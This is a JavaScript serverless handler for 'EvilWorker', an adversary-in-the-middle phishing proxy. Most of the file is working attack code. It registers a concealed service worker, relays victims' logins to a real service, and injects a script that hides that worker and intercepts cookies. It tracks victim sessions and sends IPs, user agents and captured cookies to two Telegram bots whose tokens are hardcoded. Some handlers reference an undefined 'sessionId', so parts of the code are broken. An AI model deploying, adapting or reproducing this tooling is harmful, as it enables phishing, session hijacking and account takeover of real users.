/**
 * EvilWorker Vercel Serverless Implementation
 * This is a serverless adaptation of EvilWorker for Vercel deployment
 * Following the original EvilWorker architecture exactly
 */

import crypto from 'crypto';

// EvilWorker Configuration
const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN_1 = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
const TELEGRAM_CHAT_ID_1 = "6743632244";
const TELEGRAM_BOT_TOKEN_2 = "7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U";
const TELEGRAM_CHAT_ID_2 = "6263177378";

const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/Mutation_o5y3f4O7jMGW",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico"
};

// Session storage (in production, use Redis or similar)
const VICTIM_SESSIONS = {};

// Encryption key (change for production)
const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";

// Enhanced session logging function
async function logSessionData(sessionId, data, type = 'generic') {
    if (!VICTIM_SESSIONS[sessionId]) return;
    
    const session = VICTIM_SESSIONS[sessionId];
    const logEntry = {
        timestamp: new Date().toISOString(),
        sessionId: sessionId,
        type: type,
        data: data,
        session: {
            phishedURL: session.phishedURL,
            protocol: session.protocol,
            hostname: session.hostname,
            path: session.path,
            port: session.port,
            host: session.host,
            createdAt: session.createdAt
        }
    };
    
    // Encrypt the log entry
    const encryptedData = encryptData(JSON.stringify(logEntry));
    
    // Send comprehensive session log to Telegram
    const sessionLogMessage = `📊 <b>SESSION LOG ENTRY</b>

🆔 <b>Session ID:</b> <code>${sessionId}</code>
🔗 <b>Target URL:</b> ${session.phishedURL}
🌐 <b>Domain:</b> ${session.hostname}
📝 <b>Log Type:</b> ${type}
⏰ <b>Time:</b> ${logEntry.timestamp}
📱 <b>Platform:</b> EvilWorker AiTM Framework

📋 <b>Data:</b>
<code>${JSON.stringify(data, null, 2)}</code>`;

    await sendTelegramNotification(sessionLogMessage);
    
    // In production, store encrypted data in database
    console.log(`Session log encrypted and stored for session: ${sessionId}`);
}

// Main proxy handler
export default async function handler(req, res) {
    const { method, url, headers } = req;
    
    // Parse body based on content type
    let body;
    if (method === 'POST' || method === 'PUT' || method === 'PATCH') {
        try {
            if (req.body) {
                body = typeof req.body === 'string' ? req.body : JSON.stringify(req.body);
            }
        } catch (e) {
            body = '';
        }
    }
    
    const currentSession = getUserSession(headers.cookie);
    
    // Log every request to Telegram
    const requestLog = `📡 <b>REQUEST LOGGED</b>

🔗 <b>URL:</b> ${url}
📝 <b>Method:</b> ${method}
🌐 <b>User-Agent:</b> ${headers['user-agent'] || 'Unknown'}
🌍 <b>IP:</b> ${headers['x-forwarded-for'] || headers['x-real-ip'] || 'Unknown'}
🍪 <b>Session:</b> ${currentSession || 'New Session'}
⏰ <b>Time:</b> ${new Date().toISOString()}
📊 <b>Content-Type:</b> ${headers['content-type'] || 'Unknown'}`;

    // Send request log to both Telegram bots
    await sendTelegramNotification(requestLog);

    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    try {
        // Handle service worker registration page
        if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
            const match = url.match(PHISHED_URL_REGEXP);
            if (!match) {
                console.error('No redirect_urI parameter found in URL:', url);
                res.status(400).json({ error: 'Missing redirect_urI parameter' });
                return;
            }
            
            const phishedURL = new URL(decodeURIComponent(match[0]));
            let session = currentSession;

            if (!currentSession) {
                const { cookieName, cookieValue } = generateNewSession(phishedURL);
                res.setHeader('Set-Cookie', `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
                session = cookieName; // Use cookieName as session ID (not cookieValue)
                
                // Send Telegram notification for new victim
                const telegramMessage = `🎣 <b>NEW VICTIM SESSION</b>

🔗 <b>Target URL:</b> ${phishedURL.href}
🌐 <b>Domain:</b> ${phishedURL.hostname}
⏰ <b>Time:</b> ${new Date().toISOString()}
🆔 <b>Session ID:</b> <code>${cookieName}</code>
📱 <b>Platform:</b> EvilWorker AiTM Framework`;

                await sendTelegramNotification(telegramMessage);
                
                // Log session creation
                await logSessionData(cookieName, {
                    action: 'session_created',
                    phishedURL: phishedURL.href,
                    userAgent: headers['user-agent'],
                    ip: headers['x-forwarded-for'] || headers['x-real-ip']
                }, 'session_creation');
            }

            // Update session
            if (currentSession && VICTIM_SESSIONS[currentSession]) {
                VICTIM_SESSIONS[currentSession].protocol = phishedURL.protocol;
                VICTIM_SESSIONS[currentSession].hostname = phishedURL.hostname;
                VICTIM_SESSIONS[currentSession].path = `${phishedURL.pathname}${phishedURL.search}`;
                VICTIM_SESSIONS[currentSession].port = phishedURL.port;
                VICTIM_SESSIONS[currentSession].host = phishedURL.host;
                
                // Log session update
                await logSessionData(currentSession, {
                    action: 'session_updated',
                    phishedURL: phishedURL.href
                }, 'session_update');
            }

            // Serve the initial HTML page (index_smQGUDpTF7PN.html)
            const htmlContent = `<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
</head>
<body>
    <script>
        if ("serviceWorker" in navigator) {
            navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
                scope: "/",
            })
            .then((registration) => {
                const phishedParameterURL = new URL(self.location.href).searchParams.get("redirect_urI");
                const phishedURL = new URL(decodeURIComponent(phishedParameterURL));
                self.location.replace(\`\${phishedURL.pathname}\${phishedURL.search}\`);
            })
            .catch((error) => {
                console.error(\`Service worker registration failed: \${error}\`);
            });
        }
        else {
            console.error("Service workers are not supported by this browser");
        }
    </script>
</body>
</html>`;

            res.setHeader('Content-Type', 'text/html');
            res.status(200).send(htmlContent);
            return;
        }

        // Handle service worker requests
        if (url === PROXY_PATHNAMES.serviceWorker) {
            const serviceWorkerContent = `self.addEventListener("fetch", (event) => {
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const url = new URL(request.url);
    
    // Skip service worker and script requests
    if (url.pathname.includes("service_worker") || url.pathname.includes("@")) {
        return fetch(request);
    }
    
    const proxyRequestURL = \`\${self.location.origin}/lNv1pC9AWPUY4gbidyBO\`;
    
    try {
        const proxyRequest = {
            url: request.url,
            method: request.method,
            headers: Object.fromEntries(request.headers.entries()),
            body: await request.text(),
            referrer: request.referrer,
            mode: request.mode
        };
        
        return fetch(proxyRequestURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(proxyRequest),
            redirect: "manual",
            mode: "same-origin"
        });
    } catch (error) {
        console.error(\`Fetching \${proxyRequestURL} failed: \${error}\`);
        return fetch(request);
    }
}`;

            res.setHeader('Content-Type', 'application/javascript');
            res.status(200).send(serviceWorkerContent);
            return;
        }

        // Handle script injection requests - THIS INJECTS THE MALICIOUS SCRIPT
        if (url === PROXY_PATHNAMES.script) {
            const maliciousScript = `
// EvilWorker Injected Script - Service Worker Detection Bypass & Cookie Hijacking
const originalServiceWorkerGetRegistrationDescriptor = navigator.serviceWorker.getRegistration;
navigator.serviceWorker.getRegistration = function (_scope) {
    return originalServiceWorkerGetRegistrationDescriptor.apply(this, arguments)
        .then(registration => {
            if (registration && 
                registration.active && 
                registration.active.scriptURL && 
                registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js")) {
                return undefined; // Hides malicious service worker
            }
            return registration;
        });
};

// Cookie Hijacking System
const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, "cookie");
Object.defineProperty(document, "cookie", {
    ...originalCookieDescriptor,
    get() {
        return originalCookieDescriptor.get.call(document);
    },
    set(cookie) {
        // Intercept document.cookie calls
        fetch('/JSCookie_6X7dRqLg90mH', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'cookie_set',
                cookie: cookie,
                url: window.location.href
            })
        }).catch(console.error);
        
        // Call original setter
        return originalCookieDescriptor.set.call(document, cookie);
    }
});

// DOM Mutation Monitoring
const observer = new MutationObserver((mutations) => {
    for (const mutation of mutations) {
        if (mutation.type === "attributes") {
            if (mutation.attributeName === "href" || mutation.attributeName === "action") {
                const target = mutation.target;
                const attributeValue = target.getAttribute(mutation.attributeName);
                
                if (attributeValue && attributeValue.startsWith('http')) {
                    const proxyRequestURL = new URL(`${self.location.origin}/Mutation_o5y3f4O7jMGW`);
                    proxyRequestURL.searchParams.append('redirect_urI', encodeURIComponent(attributeValue));
                    
                    fetch(proxyRequestURL, {
                        method: 'GET'
                    }).catch(console.error);
                }
            }
        }
    }
});

observer.observe(document, { 
    attributes: true, 
    attributeFilter: ['href', 'action'],
    subtree: true 
});

console.log('EvilWorker script loaded successfully');
            `;

            res.setHeader('Content-Type', 'application/javascript');
            res.status(200).send(maliciousScript);
            return;
        }

        // Handle JavaScript cookie capture endpoint
        if (url === PROXY_PATHNAMES.jsCookie) {
            try {
                const body = await req.json();
                console.log('Cookie capture request:', body);
                
                if (!VICTIM_SESSIONS[sessionId]) {
                    res.status(400).json({ error: 'Session not found' });
                    return;
                }
                
                const session = VICTIM_SESSIONS[sessionId];
                
                // Update session cookies
                if (body.cookie) {
                    session.cookies = session.cookies || [];
                    session.cookies.push(body.cookie);
                }
                
                // Log cookie capture
                await logSessionData(sessionId, {
                    type: 'cookie_capture',
                    cookie: body.cookie,
                    url: body.url || 'unknown'
                });
                
                res.status(200).json({ success: 'Cookie captured' });
            } catch (error) {
                console.error('Cookie capture error:', error);
                res.status(500).json({ error: 'Internal server error' });
            }
            return;
        }

        // Handle cross-origin navigation mutation endpoint
        if (url === PROXY_PATHNAMES.mutation) {
            try {
                const { searchParams } = new URL(req.url);
                const phishedURL = searchParams.get('redirect_urI');
                
                if (phishedURL && VICTIM_SESSIONS[sessionId]) {
                    const decodedURL = decodeURIComponent(phishedURL);
                    const targetURL = new URL(decodedURL);
                    
                    // Update session with new target
                    VICTIM_SESSIONS[sessionId].protocol = targetURL.protocol;
                    VICTIM_SESSIONS[sessionId].hostname = targetURL.hostname;
                    VICTIM_SESSIONS[sessionId].path = `${targetURL.pathname}${targetURL.search}`;
                    VICTIM_SESSIONS[sessionId].port = targetURL.port;
                    VICTIM_SESSIONS[sessionId].host = targetURL.host;
                    
                    // Log mutation
                    await logSessionData(sessionId, {
                        type: 'cross_origin_navigation',
                        targetURL: decodedURL,
                        newPath: VICTIM_SESSIONS[sessionId].path
                    });
                    
                    // Redirect through main proxy
                    res.status(301).setHeader('Location', `/lNv1pC9AWPUY4gbidyBO`);
                    res.end();
                } else {
                    res.status(400).json({ error: 'Invalid mutation request' });
                }
            } catch (error) {
                console.error('Mutation error:', error);
                res.status(500).json({ error: 'Internal server error' });
            }
            return;
        }

        // Handle main proxy endpoint - this is where the REAL EvilWorker magic happens
        if (url === PROXY_PATHNAMES.proxy) {
            try {
                const body = await req.json();
                console.log('Proxy request:', body);
                
                // For proxy requests, we need to handle both authenticated and unauthenticated cases
                let session = sessionId;
                let targetURL;
                
                try {
                    targetURL = new URL(body.url);
                } catch (error) {
                    console.error('Invalid URL in proxy request:', body.url);
                    res.status(400).json({ error: 'Invalid URL' });
                    return;
                }
                
                // Check if this is a request to our own domain (service worker script, etc.)
                if (targetURL.hostname === req.headers.host) {
                    if (targetURL.pathname === PROXY_PATHNAMES.script) {
                        // Serve the malicious script
                        res.status(200).setHeader('Content-Type', 'text/javascript');
                        res.end(`
// EvilWorker Injected Script - Service Worker Detection Bypass & Cookie Hijacking
const originalServiceWorkerGetRegistrationDescriptor = navigator.serviceWorker.getRegistration;
navigator.serviceWorker.getRegistration = function (_scope) {
    return originalServiceWorkerGetRegistrationDescriptor.apply(this, arguments)
        .then(registration => {
            if (registration && 
                registration.active && 
                registration.active.scriptURL && 
                registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js")) {
                return undefined; // Hides malicious service worker
            }
            return registration;
        });
};

// Cookie Hijacking System
const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, "cookie");
Object.defineProperty(document, "cookie", {
    ...originalCookieDescriptor,
    get() {
        return originalCookieDescriptor.get.call(document);
    },
    set(cookie) {
        // Intercept document.cookie calls
        fetch('/JSCookie_6X7dRqLg90mH', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'cookie_set',
                cookie: cookie,
                url: window.location.href
            })
        }).catch(console.error);
        
        // Call original setter
        return originalCookieDescriptor.set.call(document, cookie);
    }
});

// DOM Mutation Monitoring
const observer = new MutationObserver((mutations) => {
    for (const mutation of mutations) {
        if (mutation.type === "attributes") {
            if (mutation.attributeName === "href" || mutation.attributeName === "action") {
                const target = mutation.target;
                const attributeValue = target.getAttribute(mutation.attributeName);
                
                if (attributeValue && attributeValue.startsWith('http')) {
                    const proxyRequestURL = new URL(\`\${self.location.origin}/Mutation_o5y3f4O7jMGW\`);
                    proxyRequestURL.searchParams.append('redirect_urI', encodeURIComponent(attributeValue));
                    
                    fetch(proxyRequestURL, {
                        method: 'GET'
                    }).catch(console.error);
                }
            }
        }
    }
});

observer.observe(document, { 
    attributes: true, 
    attributeFilter: ['href', 'action'],
    subtree: true 
});

console.log('EvilWorker script loaded successfully');
                        `);
                        return;
                    }
                    
                    if (targetURL.pathname === PROXY_PATHNAMES.mutation) {
                        // Handle mutation requests
                        res.status(200).json({ success: 'Mutation handled' });
                        return;
                    }
                    
                    // Check if this is a phishing URL that should create a session
                    if (targetURL.pathname.startsWith('/login') && targetURL.search.includes('redirect_urI')) {
                        const match = targetURL.search.match(PHISHED_URL_REGEXP);
                        if (match) {
                            try {
                                const phishedURL = new URL(decodeURIComponent(match[0]));
                                
                                // Create new session for this request
                                const { cookieName, cookieValue } = generateNewSession(phishedURL);
                                res.setHeader('Set-Cookie', `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
                                
                                // Update session info
                                VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
                                VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
                                VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
                                VICTIM_SESSIONS[cookieName].port = phishedURL.port;
                                VICTIM_SESSIONS[cookieName].host = phishedURL.host;
                                
                                // Log session creation
                                await logSessionData(cookieName, {
                                    action: 'session_created_via_proxy',
                                    phishedURL: phishedURL.href,
                                    userAgent: req.headers['user-agent'],
                                    ip: req.headers['x-forwarded-for'] || req.headers['x-real-ip']
                                }, 'session_creation');
                                
                                // Redirect to the legitimate service
                                res.status(301).setHeader('Location', `${phishedURL.protocol}//${req.headers.host}${phishedURL.pathname}${phishedURL.search}`);
                                res.end();
                                return;
                            } catch (error) {
                                console.error('Error parsing phishing URL:', error);
                                res.status(400).json({ error: 'Invalid phishing URL' });
                                return;
                            }
                        }
                    }
                }
                
                // If we have a session, use it for proxying
                if (session && VICTIM_SESSIONS[session]) {
                    const sessionData = VICTIM_SESSIONS[session];
                    
                    // This is the REAL proxying logic - using Node.js HTTP/HTTPS like the original EvilWorker
                    const proxyOptions = {
                        hostname: targetURL.hostname,
                        port: targetURL.port || (targetURL.protocol === 'https:' ? 443 : 80),
                        path: `${targetURL.pathname}${targetURL.search}`,
                        method: body.method || 'GET',
                        headers: {
                            ...body.headers,
                            'host': targetURL.host,
                            'origin': `${targetURL.protocol}//${targetURL.host}`,
                            'referer': body.referrer || `${targetURL.protocol}//${targetURL.host}/`
                        }
                    };
                    
                    // Remove problematic headers
                    delete proxyOptions.headers['content-length'];
                    delete proxyOptions.headers['content-type'];
                    
                    console.log('Proxying to:', targetURL.href);
                    console.log('Proxy options:', proxyOptions);
                    
                    // Use Node.js HTTP/HTTPS modules like the original EvilWorker
                    const http = require('http');
                    const https = require('https');
                    const protocol = targetURL.protocol === 'https:' ? https : http;
                    
                    // Make the actual proxy request to Microsoft using Node.js modules
                    const proxyReq = protocol.request(proxyOptions, (proxyRes) => {
                        console.log('Proxy response received:', proxyRes.statusCode);
                        
                        // Log the proxy transaction
                        logSessionData(session, {
                            type: 'proxy_request',
                            targetURL: targetURL.href,
                            method: body.method,
                            status: proxyRes.statusCode,
                            headers: proxyRes.headers
                        }).catch(console.error);
                        
                        // Set response headers
                        const responseHeaders = {
                            'Content-Type': proxyRes.headers['content-type'] || 'text/plain',
                            'Cache-Control': 'no-store',
                            'Access-Control-Allow-Origin': `https://${req.headers.host}`,
                            'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
                            'Access-Control-Allow-Headers': 'Content-Type, Authorization'
                        };
                        
                        // Copy relevant headers from proxy response
                        for (const [key, value] of Object.entries(proxyRes.headers)) {
                            if (!['content-length', 'content-encoding', 'transfer-encoding'].includes(key.toLowerCase())) {
                                responseHeaders[key] = value;
                            }
                        }
                        
                        // Collect response body
                        let responseBody = [];
                        proxyRes.on('data', (chunk) => {
                            responseBody.push(chunk);
                        });
                        
                        proxyRes.on('end', () => {
                            const fullResponseBody = Buffer.concat(responseBody);
                            let modifiedResponse = fullResponseBody;
                            
                            // Check if response is HTML and inject malicious script
                            const contentType = proxyRes.headers['content-type'];
                            if (contentType && contentType.includes('text/html') && fullResponseBody.length > 0) {
                                // Inject the malicious script into HTML responses
                                const scriptTag = '<script src="/@"></script>';
                                const responseString = fullResponseBody.toString();
                                
                                // Try to inject after <head> tag
                                if (responseString.includes('<head>')) {
                                    modifiedResponse = responseString.replace('<head>', `<head>${scriptTag}`);
                                } else if (responseString.includes('<html>')) {
                                    modifiedResponse = responseString.replace('<html>', `<html><head>${scriptTag}</head>`);
                                } else if (responseString.includes('<body>')) {
                                    modifiedResponse = responseString.replace('<body>', `<head>${scriptTag}</head><body>`);
                                } else {
                                    // Fallback: prepend script
                                    modifiedResponse = `<head>${scriptTag}</head>${responseString}`;
                                }
                                
                                console.log('HTML response modified with script injection');
                                modifiedResponse = Buffer.from(modifiedResponse);
                            }
                            
                            // Send the modified response
                            res.status(proxyRes.statusCode).setHeaders(responseHeaders);
                            res.end(modifiedResponse);
                            
                            console.log('Proxy response sent successfully');
                        });
                    });
                    
                    proxyReq.on('error', (error) => {
                        console.error('Proxy request error:', error);
                        res.status(500).json({ error: 'Proxy request failed', details: error.message });
                    });
                    
                    // Send request body if present
                    if (body.body && body.method !== 'GET' && body.method !== 'HEAD') {
                        proxyReq.write(body.body);
                    }
                    
                    proxyReq.end();
                    
                } else {
                    // No valid session - this shouldn't happen in normal flow
                    console.warn('Proxy request without valid session:', body.url);
                    res.status(400).json({ error: 'No valid session for proxying' });
                }
                
            } catch (error) {
                console.error('Proxy error:', error);
                res.status(500).json({ error: 'Proxy request failed', details: error.message });
            }
            return;
        }

        // Default response for unmatched routes
        res.status(404).json({ error: 'Route not found' });

    } catch (error) {
        console.error('Handler error:', error);

        // Log error to both Telegram bots
        const errorLog = `❌ <b>EVILWORKER ERROR</b>

🔗 <b>URL:</b> ${url}
📝 <b>Method:</b> ${method}
🍪 <b>Session:</b> ${currentSession || 'Unknown'}
❌ <b>Error:</b> ${error.message}
📚 <b>Stack:</b> ${error.stack}
⏰ <b>Time:</b> ${new Date().toISOString()}
📱 <b>Platform:</b> EvilWorker AiTM Framework`;

        await sendTelegramNotification(errorLog);

        res.status(500).json({ error: 'Internal server error' });
    }
}

// Helper functions
function getUserSession(cookieHeader) {
    if (!cookieHeader) return null;

    const cookies = cookieHeader.split('; ').reduce((acc, cookie) => {
        const [key, value] = cookie.trim().split('=');
        acc[key] = value;
        return acc;
    }, {});

    // Find session by cookie name (not value)
    for (const [cookieName, cookieValue] of Object.entries(cookies)) {
        if (VICTIM_SESSIONS[cookieName] && VICTIM_SESSIONS[cookieName].value === cookieValue) {
            return cookieName; // Return cookie name as session ID
        }
    }
    return null;
}

function generateNewSession(phishedURL) {
    const cookieName = generateRandomString(12);
    const cookieValue = generateRandomString(32);

    VICTIM_SESSIONS[cookieName] = {
        value: cookieValue, // This is the actual cookie value
        phishedURL: phishedURL.toString(),
        protocol: phishedURL.protocol,
        hostname: phishedURL.hostname,
        path: phishedURL.pathname,
        port: phishedURL.port,
        host: phishedURL.host,
        createdAt: new Date().toISOString()
    };

    return { cookieName, cookieValue };
}

function generateRandomString(length) {
    const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join("");
}

function encryptData(data) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-ctr', Buffer.from(ENCRYPTION_KEY.slice(0, 32)), iv);

    let encrypted = cipher.update(data, 'utf8', 'hex');
    encrypted += cipher.final('hex');

    return {
        iv: iv.toString('hex'),
        data: encrypted
    };
}

// Telegram notification function
async function sendTelegramNotification(message) {
    const botTokens = [TELEGRAM_BOT_TOKEN_1, TELEGRAM_BOT_TOKEN_2];
    const chatIds = [TELEGRAM_CHAT_ID_1, TELEGRAM_CHAT_ID_2];

    for (let i = 0; i < botTokens.length; i++) {
        const botToken = botTokens[i];
        const chatId = chatIds[i];

        if (botToken === "YOUR_BOT_TOKEN_HERE" || chatId === "YOUR_CHAT_ID_HERE") {
            console.log(`Telegram bot ${i+1} not configured, skipping notification`);
            continue;
        }

        try {
            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const response = await fetch(telegramUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `👾 <b>EvilWorker</b> ${message}`,
                    parse_mode: 'HTML'
                })
            });

            if (!response.ok) {
                console.error(`Telegram notification failed for bot ${i+1}:`, response.status);
            }
        } catch (error) {
            console.error(`Telegram notification error for bot ${i+1}:`, error);
        }
    }
}
